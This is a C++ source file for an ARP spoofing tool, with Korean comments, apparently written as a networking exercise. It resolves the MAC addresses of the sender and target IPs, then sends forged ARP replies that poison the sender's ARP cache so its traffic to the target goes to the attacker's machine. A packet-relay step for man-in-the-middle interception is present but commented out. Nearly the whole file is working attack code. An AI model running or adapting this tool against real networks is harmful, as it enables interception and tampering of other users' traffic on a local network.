#include "pch.h"
#include "ethhdr.h"
#include "mac.h"
#include "ip.h"
#include "arphdr.h"
#include "packetmanager.h"
#include "addressmanager.h"
#include "etharp.h"
#include "mylibnet.h"

// 입력받은 sender ip와 target ip 페어를 u_int32_t로 저장해야겠다 안그러면, 나중에 형변환이 까다로움 
void usage() {
	printf("syntax: arp_spoofer.out <interface> {sender_ip , target_ip } ...\n");
	printf("sample: send-arp-test wlan0 1.1.1.2 1.1.1.1\n");
}

/* target_ip와 대응하는 mac주소가 올때까지 packet을 받는다 */
bool getMacFromIP(Ip target_ip,PacketManager& packetmanager,AddressManager& addrmanager){
	const u_char* packet; 
	struct pcap_pkthdr* header;
	packetmanager.packetCapture(packet,header);
	struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
	struct EthHdr ethhdr = etharphdr->eth_;
	struct ArpHdr arphdr = etharphdr->arp_;
	if(ntohs(ethhdr.type_)!=0x0806) return false;
	Ip s_ip = ntohl(arphdr.sip_);
	Mac s_mac = arphdr.smac_;
	Ip t_ip = ntohl(arphdr.tip_);
	Mac t_mac = arphdr.tmac_;
	if(string(s_ip)==string(target_ip) && string(t_mac)==string(addrmanager.getMyMac())){
		addrmanager.pushMac(s_ip,s_mac);
		return true;
	}
	else return false;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2!=0) {
		usage();
		return -1;
	}
	/* 클래스 초기화 */
	char* dev = argv[1]; 
	AddressManager addrmanager = AddressManager(string(dev));
	PacketManager packetmanager = PacketManager(string(dev));
	/* sender ip 및 target ip 페어 초기화 */
	for(int i=2;i<argc-1;i+=2){
		addrmanager.addIpPair(Ip(string(argv[i])),Ip(string(argv[i+1])));
	}
	cout<<"=======================IP 및 MAC 주소 질의 =========================="<<endl;
	/* arp request 프로토콜로 Ip들의 Mac 주소를 질의 */
    for(int i=0;i<addrmanager.getCounter();i++){
		pair<Ip,Ip> ipPair = addrmanager.getIpPair(i);
		Ip sender = ipPair.first;
		Ip target = ipPair.second;
		/* sender mac 주소 질의 */
		packetmanager.sendArpPacket(Mac("FF:FF:FF:FF:FF:FF"),addrmanager.getMyMac(),addrmanager.getMyIp(),Mac("00:00:00:00:00:00"),sender,1);
		while(true){
			if(getMacFromIP(sender,packetmanager,addrmanager)) break;
		}
		cout<<"----------------------------------------------------------------"<<endl;
		cout<<"[X] sender"<<endl;
		cout<<"IP: "<<string(sender)<<endl;
		cout<<"MAC: "<<string(addrmanager.getMacFromIp(sender))<<endl;
		/* target mac 주소 질의 */
		packetmanager.sendArpPacket(Mac("FF:FF:FF:FF:FF:FF"),addrmanager.getMyMac(),addrmanager.getMyIp(),Mac("00:00:00:00:00:00"),target,1);
		while(true){ // 조건을 만족하는 패킷이 나올때까지 queue에 담긴 패킷을 필터링 
			if(getMacFromIP(target,packetmanager,addrmanager)) break;
		}
		cout<<"[X] target"<<endl;
		cout<<"IP: "<<string(target)<<endl;
		cout<<"MAC: "<<string(addrmanager.getMacFromIp(target))<<endl;
		cout<<"-------------------------------------------------------------------"<<endl;
		
	}
	cout<<"======================================================================"<<endl;
	/* arp cache table 감염 */
	cout<<"=======================Sender Cache Infection =========================="<<endl;
	for(int i=0;i<addrmanager.getCounter();i++){
		cout<<"-------------------------------------------------------------------"<<endl;
		pair<Ip,Ip> ipPair = addrmanager.getIpPair(i);
		Ip sender = ipPair.first;
		Ip target = ipPair.second;
		Mac sender_mac = addrmanager.getMacFromIp(sender);
		Mac target_mac = addrmanager.getMacFromIp(target);
		Mac my_mac = addrmanager.getMyMac();
		cout<<"[X]Sender Ip:"<<string(sender)<<endl;
		cout<<"[X]Sender Mac:"<<string(sender_mac)<<endl;
		cout<<"[X]Target Ip:"<<string(target)<<endl;
		cout<<"[X]Target Mac:"<<string(target_mac)<<endl;
		packetmanager.sendArpPacket(sender_mac,my_mac,target,sender_mac,sender,2); /* 2번 타입 reply */
		cout<<"-------------------------------------------------------------------"<<endl;
	}
	cout<<"======================================================================"<<endl;
/* 
	thread t1(relayPacket,ref(packetmanager),ref(addrmanager));

	thread t2(producerNconsumer,ref(packetmanager));

	t1.join();
	t2.join();
 */
	
	packetmanager.close();
    return 0;
}
